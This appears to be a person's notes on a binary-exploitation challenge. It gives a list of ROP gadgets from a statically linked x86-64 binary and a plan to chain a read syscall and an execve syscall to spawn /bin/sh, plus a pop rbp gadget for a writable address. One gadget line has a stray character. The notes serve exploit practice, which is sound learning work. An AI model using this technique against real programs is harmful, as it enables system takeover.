File is statically linked, no ret-to-libc.

0x000000000040028c : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x0000000000400164 : add byte ptr [rax], al ; add byte ptr [rax], al ; syscall
0x000000000040028d : add byte ptr [rax], al ; add cl, cl ; ret
0x000000000040028e : add byte ptr [rax], al ; leave ; ret
0x0000000000400166 : add byte ptr [rax], al ; syscall
0x000000000040028f : add cl, cl ; ret
0x0000000000400192 : add dword ptr [rax], eax ; add byte ptr [rax], al ; syscall
0x0000000000400169 : add eax, 0x8bfc4589 ; cld ; pop rbp ; ret
0x000000000040016c : cld ; mov eax, dword ptr [rbp - 4] ; pop rbp ; ret
0x000000000040016f : cld ; pop rbp ; ret
0x00000000004001af : cmp al, 0 ; add byte ptr [rax], al ; syscall
0x00000000004001e5 : jmp 0x40027a
0x0000000000400290 : leave ; ret
0x000000000040016a : mov dword ptr [rbp - 4], eax ; mov eax, dword ptr [rbp - 4] ; pop rbp ; ret
0x000000000040028b : mov eax, 0 ; leave ; ret
0x0000000000400162 : mov eax, 0 ; syscall
0x00000000004001ad : mov eax, 0x3c ; syscall
0x00000000004001c1 : mov eax, 0x585a5e5f ; ret
0x0000000000400190 : mov eax, 1 ; syscall
0x000000000040016d : mov eax, dword ptr [rbp - 4] ; pop rbp ; ret
0x00000000004001aa : mov edi, eax ; mov rax, 0x3c ; syscall
0x000000000040015f : mov esi, ecx ; mov rax, 0 ; syscall
0x000000000040018d : mov esi, ecx ; mov rax, 1 ; syscall
0x0000000000400161 : mov rax, 0 ; syscall
0x00000000004001ac : mov rax, 0x3c ; syscall
0x000000000040018f : mov rax, 1 ; syscall
0x00000000004001b5 : nop ; pop rbp ; ret
0x00000000004001c5 : pop rax ; ret
0x0000000000400170 : pop rbp ; ret
0x00000000004001c2 : pop rdi ; pop rsi ; pop rdx ; pop rax ; ret
0x00000000004001c4 : pop rdx ; pop rax ; ret
0x00000000004001c3 : pop rsi ; pop rdx ; Spop rax ; ret
0x0000000000400171 : ret
0x000000000040025f : retf 0x9848
0x0000000000400163 : rol byte ptr [rax], 0 ; add byte ptr [rax], al ; syscall
0x0000000000400191 : rol byte ptr [rcx], 0 ; add byte ptr [rax], al ; syscall
0x0000000000400168 : syscall

1. Read /bin/sh + \x00 * X from stdin (X >= 8)
    rax, eax 0x00 // is already 0 when returning 
    rdi, edi 0x00
    rsi, esi buffer_addr // points to len when returning
    rdx, edx size

2. Execute execve
    rax, eax 0x3b
    rdi, edi buffer_addr
    rsi, esi buffer_addr + something
    rdx, edx buffer_addr + something


We just need these two gadgets, setup the arguments for the registers and then make the syscall.

0x00000000004001c2 : pop rdi ; pop rsi ; pop rdx ; pop rax ; ret
0x0000000000400168 : syscall

However, the code after the syscall needs a correct rbp, so we need to set an address that is writeable and does not fuck up anything.

0x0000000000400170 : pop rbp ; ret

Use an address close on the bss